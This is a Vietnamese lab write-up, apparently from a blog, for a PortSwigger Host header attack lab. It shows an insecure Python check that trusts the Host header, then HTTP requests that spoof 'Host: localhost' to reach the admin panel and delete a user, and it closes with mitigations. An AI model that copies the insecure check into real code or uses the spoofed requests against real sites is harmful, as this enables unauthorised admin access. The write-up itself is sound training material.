---
title: "[PortSwigger] Lab 3: Host Header Authentication Bypass"
date: 2026-09-14
description: "Vượt qua cơ chế kiểm soát truy cập trang quản trị nội bộ thông qua việc giả mạo header Host thành localhost."
categories: ["PortSwigger Labs"]
series: ["HTTP Host Header Attacks"]
series_order: 3
showAuthor: false
showTableOfContents: true
---

## Thông tin bài Lab
* **Tên bài Lab**: Host header authentication bypass
* **Chuyên đề**: HTTP Host Header attacks
* **Mức độ**: Apprentice
* **Mục tiêu**: Truy cập vào bảng điều khiển quản trị viên `/admin` và xóa người dùng `carlos`.

---

## 1. Mô tả bài toán & Trinh sát (Reconnaissance)

Khi cố gắng truy cập vào đường dẫn `/admin` từ trình duyệt:
```http
GET /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

Hệ thống trả về thông báo lỗi:
```html
<p class="is-warning">Admin panel only available if logged in as an administrator, or if requested from the local intranet.</p>
```

Thông báo này gợi ý rằng cơ chế phân quyền kiểm tra xem request có xuất phát từ mạng nội bộ (`local intranet` / `localhost`) hay không.

---

## 2. Cơ chế phát sinh lỗ hổng

Hệ thống kiểm tra nguồn gốc request bằng cách đọc trực tiếp header `Host`:
```python
if request.headers.get("Host") in ["localhost", "127.0.0.1"]:
    allow_admin_access()
```

Bởi vì header `Host` là một thành phần hoàn toàn do client kiểm soát trong HTTP Request, kẻ tấn công bên ngoài có thể ghi đè giá trị này để đánh lừa hệ thống rằng yêu cầu đang được gửi từ chính máy chủ nội bộ.

---

## 3. Khai thác lỗ hổng (PoC Step-by-Step)

### Bước 1: Can thiệp request truy cập `/admin`
Bắt request `GET /admin` trong Burp Suite và chuyển sang **Repeater**:
```http
GET /admin HTTP/1.1
Host: localhost
Cookie: session=...
```

Gửi request và nhận về phản hồi `200 OK` cùng giao diện quản trị viên với nút chức năng xóa tài khoản.

### Bước 2: Thực hiện xóa người dùng `carlos`
Gửi request xóa người dùng với header `Host: localhost`:
```http
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Cookie: session=...
```

Nhận phản hồi `302 Found`. Người dùng `carlos` đã bị xóa và bài lab hoàn thành!

---

## 4. Biện pháp khắc phục (Mitigation)
* **Xác thực dựa trên IP thực tế (`Remote Address`)**: Kiểm tra IP ở tầng socket kết nối TCP thực tế (`$_SERVER['REMOTE_ADDR']` hoặc socket peer address) thay vì tin tưởng header `Host`.
* **Phân tách mạng**: Đặt giao diện quản trị trên một cổng (Port) riêng hoặc mạng VPN nội bộ tách biệt hoàn toàn với Internet công cộng.
